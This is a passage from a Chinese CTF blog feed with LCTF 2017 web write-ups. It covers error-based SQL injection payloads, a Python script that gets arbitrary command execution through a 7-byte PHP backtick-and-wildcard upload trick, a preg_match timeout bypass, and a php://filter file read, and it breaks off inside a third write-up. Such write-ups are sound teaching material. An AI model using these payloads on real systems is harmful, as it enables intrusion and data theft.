<p>第三步：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">POST: pro_id=-999 union (select * from (select * from product_2017ctf as a join product_2017ctf as b using(pro_id,pro_name,owner)) as c);</div><div class="line">Duplicate column name &apos;d067a0fa9dc61a6e&apos;</div></pre></td></tr></table></figure></p>
<p>得到如下信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">库：youcanneverfindme17</div><div class="line">表：product_2017ctf</div><div class="line">字段: pro_id  pro_name owner,d067a0fa9dc61a6e</div></pre></td></tr></table></figure></p>
<h3 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h3><p>参考文章： <a href="http://blog.7ell.me/2017/05/30/2017-DDCTF-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%BF%87%E6%BB%A4%E5%88%97%E5%90%8Dget%E6%95%B0%E6%8D%AE/" target="_blank" rel="external">http://blog.7ell.me/2017/05/30/2017-DDCTF-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%BF%87%E6%BB%A4%E5%88%97%E5%90%8Dget%E6%95%B0%E6%8D%AE/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">POST:pro_id=-2513 UNION ALL SELECT NULL,CONCAT((select e.4 from (select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from product_2017ctf)e limit 1 offset 3 )),NULL,NULL--</div><div class="line"></div><div class="line">product name:7195ca99696b5a896.php</div></pre></td></tr></table></figure>
<p>最终获得完整的结构与数据如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">product_id:  1,2,3</div><div class="line">product_name: car,iphone11,nextentrance</div><div class="line">owner:Tom John Boss</div><div class="line">d067a0fa9dc61a6e:wobuzaizheli nextnext 7195ca99696b5a896.php</div></pre></td></tr></table></figure></p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>在做的过程，有想利用innodb引擎来注入，不过好像没啥用2333<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">POST:</div><div class="line">pro_id=-2513 UNION ALL SELECT NULL,CONCAT((select table_name from innodb_table_stats)),NULL,NULL--</div><div class="line"></div><div class="line">&apos;youcanneverfindme17.innodb_table_stats&apos; doesn&apos;t exist</div><div class="line">数据库：youcanneverfindme17</div></pre></td></tr></table></figure></p>
<p>根据tips，得到下一个入口地址:d067a0fa9dc61a6e7195ca99696b5a896.php<br><!-- Tip:将表的某一个字段名，和表中某一个表值进行字符串连接，就可以得到下一个入口喽~ --></p>
<h2 id="PHP的命令执行"><a href="#PHP的命令执行" class="headerlink" title="PHP的命令执行"></a>PHP的命令执行</h2><p><a href="http://182.254.246.93/d067a0fa9dc61a6e7195ca99696b5a896.php" target="_blank" rel="external">http://182.254.246.93/d067a0fa9dc61a6e7195ca99696b5a896.php</a></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/12.png?raw=true" alt=""></p>
<p>到了这里就跟 <a href="https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/web/tinyhosting-250" target="_blank" rel="external">32c3 2015 ctf-TinyHosting</a>的题目很像了。</p>
<p>就几个知识点展开说一说。</p>
<p>一个是<a href="http://php.net/manual/zh/language.basic-syntax.phptags.php" target="_blank" rel="external">php的短标签</a>。当php.ini的<code>short_open_tag=on</code>时，PHP支持短标签，默认情况下为off。当开启后能执行<code>&lt;? ?&gt;</code>标签内的php语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:/var/www/html$ cat test.php</div><div class="line">&lt;? echo &quot;chybeta\n&quot;;?&gt;</div><div class="line">chybeta@ubuntu:/var/www/html$ curl 127.0.0.1/test.php</div><div class="line">chybeta</div><div class="line">chybeta@ubuntu:/var/www/html$</div></pre></td></tr></table></figure></p>
<p>另一个知识点是<a href="http://php.net/manual/zh/language.operators.execution.php" target="_blank" rel="external">php的反引号命令执行</a>，php会反引号内的内容作为shell命令执行，效果与 shell_exec()同。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:/var/www/html$ cat test.php</div><div class="line">&lt;? $temp = `date`; echo $temp;?&gt;</div><div class="line">chybeta@ubuntu:/var/www/html$ curl 127.0.0.1/test.php</div><div class="line">Wed Nov 22 22:01:34 CST 2017</div><div class="line">chybeta@ubuntu:/var/www/html$</div></pre></td></tr></table></figure></p>
<p>第三个知识点是关于<a href="http://php.net/manual/zh/function.echo.php" target="_blank" rel="external">php的echo</a>，echo有个快捷写法，可以在打开标记前直接用一个等号。见下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:/var/www/html$ curl 127.0.0.1/test.php</div><div class="line">chybeta</div><div class="line">chybeta@ubuntu:/var/www/html$ vim test.php</div><div class="line">chybeta@ubuntu:/var/www/html$ cat test.php</div><div class="line">&lt;?=&quot;chybeta\n&quot;;</div><div class="line">chybeta@ubuntu:/var/www/html$ curl 127.0.0.1/test.php</div><div class="line">chybeta</div><div class="line">chybeta@ubuntu:/var/www/html$</div></pre></td></tr></table></figure></p>
<p>我们的需求：执行命令，得到回显。结合上面三个知识点，在7个字节的限制下，比如构造如下（）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?=`w`;</div></pre></td></tr></table></figure></p>
<p>（题外话：命令<code>w</code>用于显示已经登陆系统的用户列表）</p>
<p>运行结果：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/21.png?raw=true" alt=""></p>
<p>不过怎么执行任意命令呢？这里用到第四个知识点，shell中的通配符<code>*</code>会将符合模式的文件列出来，之后执行，详情可见这里<a href="http://man.chinaunix.net/linux/mandrake/101/zh_cn/Command-Line.html/glob-regex.html" target="_blank" rel="external">Shell 通配符</a>。所以当文件夹下有如下文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash z.sh</div></pre></td></tr></table></figure></p>
<p>而我在shell中直接键入一个<code>*</code>即：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu: *</div></pre></td></tr></table></figure></p>
<p>shell会匹配并进行替换，完成替换后实际执行的命令为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu: bash c.sh</div></pre></td></tr></table></figure></p>
<p>由于这属于shell后台自动完成就不展示了。</p>
<p>接着要考虑一点，我们需要用<code>*</code>来利用文件名执行任意命令，因此在文件名的构造顺序上需要注意。比如我们最终要在文件下生成这三个文件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash c.sh z.php</div></pre></td></tr></table></figure></p>
<p>才能成功的执行c.sh。</p>
<p>附上利用脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">url = <span class="string">"http://182.254.246.93/d067a0fa9dc61a6e7195ca99696b5a896.php"</span></div><div class="line">user_agent = <span class="string">"xxx"</span></div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">	command = raw_input(<span class="string">"input command: "</span>)</div><div class="line">	t = requests.post(url, headers = &#123;<span class="string">'User-agent'</span>: user_agent &#125;, data = &#123;<span class="string">"filename"</span>:<span class="string">"z.php"</span>, <span class="string">"content"</span>:<span class="string">"&lt;?=`*`;"</span>&#125;).text</div><div class="line">	[path] = re.findall(<span class="string">'files.*/zzz.php'</span>, t)</div><div class="line"></div><div class="line">	requests.post(url, headers = &#123;<span class="string">'User-agent'</span>: user_agent &#125;, data = &#123;<span class="string">"filename"</span>:<span class="string">"bash"</span>, <span class="string">"content"</span>:<span class="string">'anything'</span>&#125;)</div><div class="line">	requests.post(url, headers = &#123;<span class="string">'User-agent'</span>: user_agent &#125;, data = &#123;<span class="string">"filename"</span>:<span class="string">"c.sh"</span>, <span class="string">"content"</span>: command&#125;)</div><div class="line">	url1 = <span class="string">"http://182.254.246.93/"</span></div><div class="line">	r = requests.get(url1+path)</div><div class="line">	<span class="keyword">print</span> r.text</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/4.png?raw=true" alt=""></p>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$flag = &quot;LCTF&#123;n1ver_stop_nev2r_giveup&#125;&quot;;</div></pre></td></tr></table></figure></p>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul>
<li>基于报错的sql注入：<ul>
<li>获取库名，表名，列名，数据</li>
<li>join using</li>
</ul>
</li>
<li>php技巧:<ul>
<li>短标签</li>
<li>反引号</li>
<li>echo缩写</li>
</ul>
</li>
<li>shell通配符</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;补充关于第一阶段sql注入知识/背景，第二节阶段命令执行详细过程及其知识点&lt;/p&gt;
&lt;p&gt;LCTF-2017-他们有什么秘密呢-writeup&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>LCTF-2017-萌萌哒报名系统-writeup</title>
    <link href="http://chybeta.github.io/2017/11/19/LCTF-2017-%E8%90%8C%E8%90%8C%E5%93%92%E6%8A%A5%E5%90%8D%E7%B3%BB%E7%BB%9F-writeup/"/>
    <id>http://chybeta.github.io/2017/11/19/LCTF-2017-萌萌哒报名系统-writeup/</id>
    <published>2017-11-19T12:52:48.000Z</published>
    <updated>2017-11-19T23:24:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>趁着期中考，复习累了做几道ctf玩玩，只做出来3道web。感谢师傅们出的题！先放上简单的wp版本，一些细节后续再更新吧。</p>
<p>LCTF-2017-萌萌哒报名系统-writeup<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">天依花了一整天的时间用IDE开发了一个报名系统，现在她睡着了，难道你们不想做点什么嘛XD?</div><div class="line">http://123.206.120.239/</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h2><p>根据题目信息，用了IDE,比如phpstrom，以前做百度杯时碰到过。尝试访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://123.206.120.239/.idea/workspace.xml</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/13.png?raw=true" alt=""></p>
<p>发现源码包：xdcms2333.zip。下载下来进行审计。</p>
<h2 id="基本流程梳理"><a href="#基本流程梳理" class="headerlink" title="基本流程梳理"></a>基本流程梳理</h2><h3 id="regisrer-php"><a href="#regisrer-php" class="headerlink" title="regisrer.php"></a>regisrer.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line">	<span class="keyword">try</span>&#123;</div><div class="line">		$pdo = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=xdcms'</span>, $user, $pass);</div><div class="line">	&#125;<span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)&#123;</div><div class="line">		<span class="keyword">die</span>(<span class="string">'mysql connected error'</span>);</div><div class="line">	&#125;</div><div class="line">	$admin = <span class="string">"xdsec"</span>.<span class="string">"###"</span>.str_shuffle(<span class="string">'you_are_the_member_of_xdsec_here_is_your_flag'</span>);</div><div class="line">    $username = (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) === <span class="keyword">true</span> &amp;&amp; $_POST[<span class="string">'username'</span>] !== <span class="string">''</span>) ? (string)$_POST[<span class="string">'username'</span>] : <span class="keyword">die</span>(<span class="string">'Missing username'</span>);</div><div class="line">    $password = (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) === <span class="keyword">true</span> &amp;&amp; $_POST[<span class="string">'password'</span>] !== <span class="string">''</span>) ? (string)$_POST[<span class="string">'password'</span>] : <span class="keyword">die</span>(<span class="string">'Missing password'</span>);</div><div class="line">    $code = (<span class="keyword">isset</span>($_POST[<span class="string">'code'</span>]) === <span class="keyword">true</span>) ? (string)$_POST[<span class="string">'code'</span>] : <span class="string">''</span>;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (strlen($username) &gt; <span class="number">16</span> || strlen($username) &gt; <span class="number">16</span>) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'Invalid input'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $sth = $pdo-&gt;prepare(<span class="string">'SELECT username FROM users WHERE username = :username'</span>);</div><div class="line">    $sth-&gt;execute([<span class="string">':username'</span> =&gt; $username]);</div><div class="line">    <span class="keyword">if</span> ($sth-&gt;fetch() !== <span class="keyword">false</span>) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'username has been registered'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $sth = $pdo-&gt;prepare(<span class="string">'INSERT INTO users (username, password) VALUES (:username, :password)'</span>);</div><div class="line">    $sth-&gt;execute([<span class="string">':username'</span> =&gt; $username, <span class="string">':password'</span> =&gt; $password]);</div><div class="line"></div><div class="line">    preg_match(<span class="string">'/^(xdsec)((?:###|\w)+)$/i'</span>, $code, $matches);</div><div class="line">    <span class="keyword">if</span> (count($matches) === <span class="number">3</span> &amp;&amp; $admin === $matches[<span class="number">0</span>]) &#123;</div><div class="line">        $sth = $pdo-&gt;prepare(<span class="string">'INSERT INTO identities (username, identity) VALUES (:username, :identity)'</span>);</div><div class="line">        $sth-&gt;execute([<span class="string">':username'</span> =&gt; $username, <span class="string">':identity'</span> =&gt; $matches[<span class="number">1</span>]]);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $sth = $pdo-&gt;prepare(<span class="string">'INSERT INTO identities (username, identity) VALUES (:username, "GUEST")'</span>);</div><div class="line">        $sth-&gt;execute([<span class="string">':username'</span> =&gt; $username]);</div><div class="line">    &#125;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("register success");location.href="./index.html"&lt;/script&gt;'</span>;</div></pre></td></tr></table></figure>
<h3 id="login-php"><a href="#login-php" class="headerlink" title="login.php"></a>login.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	session_start();</div><div class="line">	<span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line">	<span class="keyword">try</span>&#123;</div><div class="line">		$pdo = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=xdcms'</span>, $user, $pass);</div><div class="line">	&#125;<span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)&#123;</div><div class="line">		<span class="keyword">die</span>(<span class="string">'mysql connected error'</span>);</div><div class="line">	&#125;</div><div class="line">	$username = (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) === <span class="keyword">true</span> &amp;&amp; $_POST[<span class="string">'username'</span>] !== <span class="string">''</span>) ? (string)$_POST[<span class="string">'username'</span>] : <span class="keyword">die</span>(<span class="string">'Missing username'</span>);</div><div class="line">    $password = (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) === <span class="keyword">true</span> &amp;&amp; $_POST[<span class="string">'password'</span>] !== <span class="string">''</span>) ? (string)$_POST[<span class="string">'password'</span>] : <span class="keyword">die</span>(<span class="string">'Missing password'</span>);</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (strlen($username) &gt; <span class="number">32</span> || strlen($password) &gt; <span class="number">32</span>) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'Invalid input'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $sth = $pdo-&gt;prepare(<span class="string">'SELECT password FROM users WHERE username = :username'</span>);</div><div class="line">    $sth-&gt;execute([<span class="string">':username'</span> =&gt; $username]);</div><div class="line">    <span class="keyword">if</span> ($sth-&gt;fetch()[<span class="number">0</span>] !== $password) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'wrong password'</span>);</div><div class="line">    &#125;</div><div class="line">    $_SESSION[<span class="string">'username'</span>] = $username;</div><div class="line">	<span class="keyword">unset</span>($_SESSION[<span class="string">'is_logined'</span>]);</div><div class="line">	<span class="keyword">unset</span>($_SESSION[<span class="string">'is_guest'</span>]);</div><div class="line">	<span class="comment">#echo $username;</span></div><div class="line">	header(<span class="string">"Location: member.php"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<h3 id="member-php"><a href="#member-php" class="headerlink" title="member.php"></a>member.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	error_reporting(<span class="number">0</span>);</div><div class="line">	session_start();</div><div class="line">	<span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>]) === <span class="keyword">false</span>) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'please login first'</span>);</div><div class="line">    &#125;</div><div class="line">	<span class="keyword">try</span>&#123;</div><div class="line">		$pdo = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=xdcms'</span>, $user, $pass);</div><div class="line">	&#125;<span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)&#123;</div><div class="line">		<span class="keyword">die</span>(<span class="string">'mysql connected error'</span>);</div><div class="line">	&#125;</div><div class="line">    $sth = $pdo-&gt;prepare(<span class="string">'SELECT identity FROM identities WHERE username = :username'</span>);</div><div class="line">    $sth-&gt;execute([<span class="string">':username'</span> =&gt; $_SESSION[<span class="string">'username'</span>]]);</div><div class="line">    <span class="keyword">if</span> ($sth-&gt;fetch()[<span class="number">0</span>] === <span class="string">'GUEST'</span>) &#123;</div><div class="line">        $_SESSION[<span class="string">'is_guest'</span>] = <span class="keyword">true</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $_SESSION[<span class="string">'is_logined'</span>] = <span class="keyword">true</span>;</div><div class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'is_logined'</span>]) === <span class="keyword">false</span> || <span class="keyword">isset</span>($_SESSION[<span class="string">'is_guest'</span>]) === <span class="keyword">true</span>) &#123;</div><div class="line"></div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])===<span class="keyword">false</span>)</div><div class="line">			<span class="keyword">echo</span> <span class="string">"None"</span>;</div><div class="line">		<span class="keyword">elseif</span>(is_file($_GET[<span class="string">'file'</span>]))</div><div class="line">			<span class="keyword">echo</span> <span class="string">"you cannot give me a file"</span>;</div><div class="line">		<span class="keyword">else</span></div><div class="line">			readfile($_GET[<span class="string">'file'</span>]);</div><div class="line">	&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<h2 id="php的preg-match"><a href="#php的preg-match" class="headerlink" title="php的preg_match"></a>php的preg_match</h2><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/3.png?raw=true" alt=""><br>在code部分填入超长的字符串，并且符合preg_match匹配的模式。则在register.php在preg_match时导致超时php脚本停止，字符串<code>guest</code>没有被插入成功。之后在login.php中登陆用户跳转至member.php后，下述代码将会跳过:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">if ($sth-&gt;fetch()[0] === &apos;GUEST&apos;) &#123;</div><div class="line">	$_SESSION[&apos;is_guest&apos;] = true;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>并在接下来的判断中，进入else分支：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">if(isset($_GET[&apos;file&apos;])===false)</div><div class="line">	echo &quot;None&quot;;</div><div class="line">elseif(is_file($_GET[&apos;file&apos;]))</div><div class="line">	echo &quot;you cannot give me a file&quot;;</div><div class="line">else</div><div class="line">	readfile($_GET[&apos;file&apos;]);</div></pre></td></tr></table></figure></p>
<p>上次微信崩溃，好像也是正则匹配搞得鬼嘛。二者原理不同，不过应该还是有某种神似的。</p>
<h2 id="php的is-file和readfile"><a href="#php的is-file和readfile" class="headerlink" title="php的is_file和readfile"></a>php的is_file和readfile</h2><p>在进入成功后，需要提供file参数来读取文件。需要绕过is_file，考虑配合php伪协议。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/member.php?file=php://filter/read=convert.base64-encode/resource=config.php</div></pre></td></tr></table></figure></p>
<p>isfile判断为假，而readfile利用伪协议读取到config.php文件</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/2.png?raw=true" alt=""></p>
<p>得到config.php源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$user = <span class="string">"xdsec"</span>;</div><div class="line">$pass = <span class="string">"xdsec"</span>;</div><div class="line">$flag = <span class="string">"LCTF&#123;pr3_maTch_1s_A_amaz1ng_Function&#125;"</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">LCTF&#123;pr3_maTch_1s_A_amaz1ng_Function&#125;</div></pre></td></tr></table></figure></p>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul>
<li>PHP的preg_match</li>
<li>isfile、readfile</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;趁着期中考，复习累了做几道ctf玩玩，只做出来3道web。感谢师傅们出的题！先放上简单的wp版本，一些细节后续再更新吧。&lt;/p&gt;
&lt;p&gt;LCTF-2017-萌萌哒报名系统-writeup&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>LCTF 2017-Simple blog-writeup</title>
    <link href="http://chybeta.github.io/2017/11/18/LCTF-2017-Simple-blog-writeup/"/>
    <id>http://chybeta.github.io/2017/11/18/LCTF-2017-Simple-blog-writeup/</id>
    <published>2017-11-18T14:42:04.000Z</published>
    <updated>2017-11-22T14:52:04.000Z</updated>
    
    <content type="html"><![CDATA[<p>更新：</p>
<ol>
<li>CBC翻转攻击脚本</li>
<li>格式化字符串sql注入详细解答</li>
</ol>
<p>趁着期中考，复习累了做几道ctf玩玩，只做出来3道web。感谢师傅们出的题！</p>
<p>LCTF 2017-Simple blog-writeup<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A simple blog .To discover the secret of it.</div><div class="line">http://111.231.111.54/</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://111.231.111.54/.login.php.swp</div><div class="line">http://111.231.111.54/.admin.php.swp</div></pre></td></tr></table></figure>
<p>下载下来后，用<code>vim -r</code>恢复，得到源代码：</p>
<p>login.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">session_start();</div><div class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</div><div class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_page</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'省略'</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_token</span><span class="params">()</span></span>&#123;</div><div class="line">    $random_token = <span class="string">''</span>;</div><div class="line">    $str = <span 